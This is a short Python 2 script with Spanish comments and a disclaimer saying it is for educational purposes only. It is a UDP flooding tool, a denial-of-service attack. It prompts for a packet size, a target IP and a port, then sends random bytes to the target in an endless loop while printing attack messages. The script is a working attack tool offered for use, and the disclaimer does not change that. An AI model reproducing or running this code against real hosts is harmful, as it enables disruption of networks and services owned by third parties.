import sys
import os
import random
import socket
from sys import platform



########################################
########################################
# Solo propósito educativo          #
########################################
# No me hago responsable de sus acciones #
########################################
########################################




"""
=========================
Creado por: Absurded
==========================
"""



if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print("El mejor script para linux")
elif platform == "win32":
    os.system("cls")
else:
    print ("\033[1;34m [-]No detecte el sistema \033[1;m")

print("\033[1;32m")

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print(r"""

 ________________________________________
/          Created By: Absurded          \
|       Si usa demaciados Bytes           |
\       Su internet se relentisara       /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

""")



try:
    size = input("bytes> ")
    attack = random._urandom(size)
    ip = raw_input("IP> ")
    port = input("port> ")
    print (" ")
    print ("Empezando ataque")
    print (" ")
except SyntaxError:
    print (" ")
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print (" ")
    exit("\033[1;34m No pusiste nada \033[1;m")
except KeyboardInterrupt:
    print (" ")
    exit("\033[1;34m [-]Cancelado Por User \033[1;m")
except ImportError:
    print (" ")
    exit("\033[1;34m [-]Instala python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        print ("Atacando, enviando bytes ===>")
    except KeyboardInterrupt:
        print (" ")
        exit("\033[1;34m [-]Cancelado por User \033[1;m")
    except ImportError:
        print (" ")
        exit("\033[1;34m [-]instala python 2.7.15")